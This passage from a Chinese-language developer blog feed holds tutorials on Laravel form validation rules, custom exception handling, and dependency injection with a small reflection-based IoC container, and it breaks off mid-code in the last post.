        <content type="html"><![CDATA[<p>Laravel 的表单验证非常强大，结合单一职责原则，在Request 类中就能满足日常开发绝大多数验证场景。</p><a id="more"></a><p>下面整理了常用的一些表单验证规则，大致可以分为以下几类：</p><ol><li>常规验证</li><li>自定义规则验证</li><li>数据库验证</li></ol><h2 id="常规验证"><a href="#常规验证" class="headerlink" title="常规验证"></a>常规验证</h2><p>所谓的常规验证就是直接使用Laravel 表单验证为我们提供的验证规则。</p><h3 id="boolean"><a href="#boolean" class="headerlink" title="boolean"></a>boolean</h3><p>验证的字段必须可以转换为 Boolean 类型。 可接受的输入为 <code>true</code> ， <code>false</code> ， <code>1</code> ，<code>0</code> ， <code>&quot;1&quot;</code> 和 <code>&quot;0&quot;</code> 。</p><h3 id="alpha"><a href="#alpha" class="headerlink" title="alpha"></a>alpha</h3><p>待验证字段只能由字母组成。</p><h3 id="alpha-num"><a href="#alpha-num" class="headerlink" title="alpha_num"></a>alpha_num</h3><p>待验证字段只能由字母和数字组成。</p><h3 id="array"><a href="#array" class="headerlink" title="array"></a>array</h3><p>待验证字段必须是有效的 PHP 数组。</p><h3 id="url"><a href="#url" class="headerlink" title="url"></a>url</h3><p>验证的字段必须是有效的 URL。</p><h3 id="integer"><a href="#integer" class="headerlink" title="integer"></a>integer</h3><p>验证的字段必须是整数。</p><h3 id="numeric"><a href="#numeric" class="headerlink" title="numeric"></a>numeric</h3><p>验证字段必须为数值。</p><p>注意数值和整数的区别。</p><h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><p>验证的字段必须是有效的 JSON 字符串。</p><h3 id="max-min"><a href="#max-min" class="headerlink" title="max/min"></a>max/min</h3><p>验证字段必须在最小值与最大值之间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"value"</span> =&gt; <span class="string">"max:99|min:1"</span>    </span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><p>验证字段必须包含在给定的值列表中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"value"</span> =&gt; <span class="string">"in:0,1,2,3"</span>    </span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="digits-between"><a href="#digits-between" class="headerlink" title="digits_between"></a>digits_between</h3><p>验证中的字段必须为 numeric，并且长度必须在给定的 min 和 max 之间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"mobile"</span> =&gt; <span class="string">"digits_between:8,11"</span>    </span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="dimensions"><a href="#dimensions" class="headerlink" title="dimensions"></a>dimensions</h3><p>验证的文件必须是图片并且图片比例必须符合规则:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'avatar'</span> =&gt; <span class="string">'dimensions:min_width=100,min_height=200'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>对于图片的验证，使用 <code>dimensions</code> 尤其有用。</p><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>验证的文件必须是图片 (jpeg, png, bmp, gif, svg, or webp)。</p><h3 id="required"><a href="#required" class="headerlink" title="required"></a>required</h3><p>验证的字段必须存在于输入数据中，而不是空。如果满足以下条件之一，则字段被视为「空」：</p><ul><li>值为 null。</li><li>值为空字符串。</li><li>值为空数组或空 Countable 对象。</li><li>值为无路径的上传文件。</li></ul><h3 id="filled"><a href="#filled" class="headerlink" title="filled"></a>filled</h3><p>验证的字段在存在时不能为空。</p><h3 id="exclude-if"><a href="#exclude-if" class="headerlink" title="exclude_if"></a>exclude_if</h3><p>可以指定当验证字段的值为 value 时，其他验证规则可以排除。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"id"</span> =&gt; <span class="string">"required|exclude_if:id,0|integer|exists:admin,id"</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>当 <code>id</code> 为零时，不会验证<code>exists</code> 规则。</p><h2 id="自定义规则验证"><a href="#自定义规则验证" class="headerlink" title="自定义规则验证"></a>自定义规则验证</h2><p>如果某个规则仅仅只使用一次，那么使用闭包来创建自定义规则再适合不过，闭包函数接收属性的方法，属性的值以及在校验失败时的回调函数 <code>$fail</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"age"</span> =&gt; <span class="function"><span class="keyword">function</span> <span class="params">($attribute, $value, $fail)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> ($value &gt; <span class="number">18</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> $fail(<span class="string">"年龄不符"</span>);</span><br><span class="line">          &#125; </span><br><span class="line">     &#125;;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="数据库验证"><a href="#数据库验证" class="headerlink" title="数据库验证"></a>数据库验证</h2><h3 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h3><p>验证的字段必须存在于给定的数据库表中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'exists:users,email_address'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h3><p>验证字段在给定的数据库表中必须是唯一的。</p><p>语法：<code>unique:table,column,except,idColumn</code>。</p><p>基本用法，指定自定义的列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'unique:users,email_address'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>在做<code>update</code> 操作时，如果提交了 <code>email</code>，那么上面的那个验证仍然会生效，这时可以通过定义  <code>except</code> 当前用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'unique:users,email_address,$this-&gt;uid,uid'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>生成的SQL：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) <span class="keyword">as</span> aggregate from users where email_address = <span class="string">"geeek001@qq.com"</span> <span class="keyword">and</span> uid &lt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>同样可以使用<code>Rule</code> 助手函数来完成数据库验证：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"email"</span> =&gt; [</span><br><span class="line">          Rule::unique(<span class="string">"users"</span>, <span class="string">"email_address"</span>),</span><br><span class="line">      ],    </span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/docs/laravel/8.x/validation/9374#6cc7dc" target="_blank" rel="noopener">Laravel 表单验证</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Exception 基本使用</title>
      <link href="/basic-use-of-laravel-cxception/"/>
      <url>/basic-use-of-laravel-cxception/</url>
      
        <content type="html"><![CDATA[<p>在Laravel 中，所有异常都是由 <code>App\Exceptions\Handler</code> 类处理，同时也会记录在日志信息中。</p><a id="more"></a><p>通常可能会直接使用 <code>throw new \Exception</code> 来抛出一个异常终止流程，但是由于系统可能会有各式各样的异常，业务代码处处抛出 <code>\Exception</code> 和捕获 <code>\Exception</code>，导致如果遇到系统错误，无法及时通知。</p><p>异常可以大致分为两类： 用户异常 和 系统异常。</p><h3 id="用户错误行为触发的异常"><a href="#用户错误行为触发的异常" class="headerlink" title="用户错误行为触发的异常"></a>用户错误行为触发的异常</h3><p>比如访问一个不存在的资源，对于此类异常我们需要把触发异常的原因告知用户。</p><p>可以把这类异常命名为 <code>InvalidRequestException</code>，在Laravel 中，可以通过 <code>make:exception</code> 命令来创建异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:exception InvalidRequestException</span><br></pre></td></tr></table></figure><p><code>app/Exceptions/InvalidRequestException.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Exceptions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvalidRequestException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $message = <span class="string">""</span>, int $code = <span class="number">400</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($message, $code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;expectsJson()) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;json([<span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;message], <span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'pages.error'</span>, [<span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;message]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里重写了<code>Illuminate\Foundation\Exceptions\Handler</code> 父类的<code>render()</code> 方法，异常被触发时系统会调用 <code>render()</code> 方法来输出，可以在<code>render()</code> 里判断如果是 AJAX 请求则返回 JSON 格式的数据，否则就返回一个错误页面。</p><p>当异常触发时 Laravel 默认会把异常的信息和调用栈打印到日志（<code>storage/logs/laravel.log</code>）里，比如：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210522110729.png" alt=""></p><p>比如用户异常并不是因为系统本身的问题导致的，不会影响系统的运行，如果大量此类日志打印到日志文件里反而会影响我们去分析真正有问题的异常，因此需要屏蔽这个行为。</p><p>在<code>app/Exceptions/Handler.php</code>类中，将需要屏蔽的类加入到<code>dontReport</code> 属性中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $dontReport = [</span><br><span class="line">      InvalidRequestException::class,</span><br><span class="line">  ];</span><br></pre></td></tr></table></figure><h3 id="系统内部异常"><a href="#系统内部异常" class="headerlink" title="系统内部异常"></a>系统内部异常</h3><p>比如连接数据库失败，或者某SQL 执行异常，对于此类异常需要有限度地告知用户发生了什么，因此，可以传入两条信息，一条是给用户看的，另一条是打印到日志中给开发人员看的。</p><p>新建一个 <code>InternalException</code> 类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:exception InternalException</span><br></pre></td></tr></table></figure><p><code>app/Exceptions/InternalException.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Exceptions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InternalException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $msgForUser;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $message, string $msgForUser = <span class="string">'系统内部错误'</span>, int $code = <span class="number">500</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($message, $code);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msgForUser = $msgForUser;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;expectsJson()) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;json([<span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;msgForUser], <span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'pages.error'</span>, [<span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;msgForUser]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该类中，只需要传入真正的异常，记录到日志中，而最终返回给用户的只有『系统内部错误』这些信息。</p><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>假设在控制器中，需要调用一个封装好的API 类，在该类中，使用<code>\Exception</code> 抛出异常，那么在控制器中，可以使用我们自定义的<code>InternalException</code> 类进行接管异常。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Api</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Api</span>\<span class="title">UserApiService</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span><span class="params">(UserRequest $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            </span><br><span class="line">            UserApiService::doSomething();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $exception) &#123;   <span class="comment">// 接管 \Exception 异常</span></span><br><span class="line">            <span class="comment">// 抛出自定义异常</span></span><br><span class="line">            <span class="comment">// $exception-&gt;getMessage() 为 UserApiService 抛出的具体异常信息</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalException($exception-&gt;getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端触发异常：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"系统内部异常"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://learnku.com/courses/laravel-shop/8.x/exceptions/10097#0c45e2" target="_blank" rel="noopener">Laravel 优雅地处理异常</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用一个 IoC 容器来理解什么是依赖注入/控制反转</title>
      <link href="/understand-dependency-injection-and-inversion-of-control/"/>
      <url>/understand-dependency-injection-and-inversion-of-control/</url>
      
        <content type="html"><![CDATA[<p>经常会听到『依赖注入』(DependencyInjection)和『控制反转』(Inversion of Control)这两个名词，初学者往往会被其给吓住，误以为是什么特别高深的技术，其实了解了来龙去脉之后，就会发现仅仅只是名字听上去高大上而已。</p><a id="more"></a><h2 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h2><p>依赖和注入其实说的是同一个东西，它们只是一种编程的思想，其主要作用是用于减少程序间的耦合。以及有效分离对象和它所需的外部资源。</p><p>下面先来看一个简单的小例子来体会下什么是『依赖注入』：</p><p><code>car.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pay</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"199"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>person.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $bwm = <span class="keyword">new</span> Car();</span><br><span class="line">        <span class="keyword">return</span> $bwm-&gt;pay();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$boo = <span class="keyword">new</span> \di\Person();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $boo-&gt;buy();  <span class="comment">// 199</span></span><br></pre></td></tr></table></figure><p>在上面这个例子（主要看Person 这个类），需要明确几个概念：</p><ol><li>依赖：谁依赖了谁？</li><li>注入：谁又注入了谁？</li></ol><p>通过观察可以发现：</p><ol><li>Car 类在Person 类中实例化（Person 类『依赖』于Car 类）</li><li>但此时并没有发现谁『注入』谁</li></ol><p>观察<code>buy()</code> 这个方法，假如需求发生变化，需要买的不是一辆车，而是一栋房，那么还得更改 Person 类的源码，由实例化一辆车改为实例化一栋房。更好的做法应该是，把所需的实例，通过函数参数的方式传入进来。</p><p><code>Person.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $obj-&gt;pay();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>index.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$boo = <span class="keyword">new</span> \di\Person();</span><br><span class="line"></span><br><span class="line">$car = <span class="keyword">new</span> \di\Car();</span><br><span class="line"><span class="keyword">echo</span> $boo-&gt;buy($car);  <span class="comment">// 199</span></span><br></pre></td></tr></table></figure><p>现在可以清晰的看到，<code>Car类</code>通过函数参数的方式『注入』到了<code>Person 类</code>中。</p><p>『依赖注入』有多种，这里只是用一个最简单的例子来解释『依赖注入』的思想以及可以有效地解决什么问题：</p><ol><li>减少程序间的耦合</li><li>分离对象和它所需的外部资源</li></ol><h2 id="控制反转"><a href="#控制反转" class="headerlink" title="控制反转"></a>控制反转</h2><p>那么啥是控制反转呢？</p><p>再次观察最开始的代码，可以发现，Car 类在Person 类中是<strong>被动实例化</strong>，Person 类<strong>正向控制</strong>了Car 类，其实例化顺序是先有了Person 类才有Car 类：<code>Person -&gt; Car</code>。</p><p>改成后面的注入方式之后，则可以发现，Car 类是<strong>主动实例化</strong>，Person 类失去了对Car 类的控制权，其实例化顺序是先有Car 类才有Person 类：<code>Car -&gt; Person</code>。</p><p>这就是『控制反转』。</p><p>其实很多时候，我们在不经意间都有使用到这种思想，只是自己没有意识到。</p><h2 id="IoC-容器"><a href="#IoC-容器" class="headerlink" title="IoC 容器"></a>IoC 容器</h2><p>Ioc容器（Inversion of Control）常常伴随着依赖注入、控制反转一起出现，那么它倒底是个什么东西呢？</p><p>在回答这个问题之前，先来看看上面的那段代码，虽然最后使用依赖注入的方式解耦了<code>Person类</code> 和<code>Car 类</code>，但此时又会面临一个新的问题：依赖仍然需要手动创建，此时只有两个类相互依赖还好，一旦类的依赖关系，嵌套过深，手动创建就会变成一件麻烦事：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$boo = <span class="keyword">new</span> \di\Person();</span><br><span class="line"><span class="keyword">echo</span> $boo-&gt;buy(<span class="keyword">new</span> \di\Car());  <span class="comment">// 199</span></span><br></pre></td></tr></table></figure><p>这时候，就需要IoC 容器登场了。</p><p>IoC 容器的核心是通过PHP 的 <a href="https://www.php.net/manual/en/book.reflection.php" target="_blank" rel="noopener">反射 (Reflection)</a> 来实现的。</p><p><code>IoC.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IoC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">maket</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionClass($className);</span><br><span class="line">        $construct = $reflect-&gt;getConstructor();</span><br><span class="line">        <span class="keyword">if</span> (!$construct) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> $className;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $params = $construct-&gt;getParameters();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($params)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> $className;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $args = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $param) &#123;</span><br><span class="line">            $class = $param-&gt;getClass();</span><br><span class="line">            <span class="keyword">if</span> ($class) &#123;</span><br><span class="line">                $args[] = <span class="keyword">static</span>::make($class-&gt;name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $reflect-&gt;newInstanceArgs($args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>person.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span 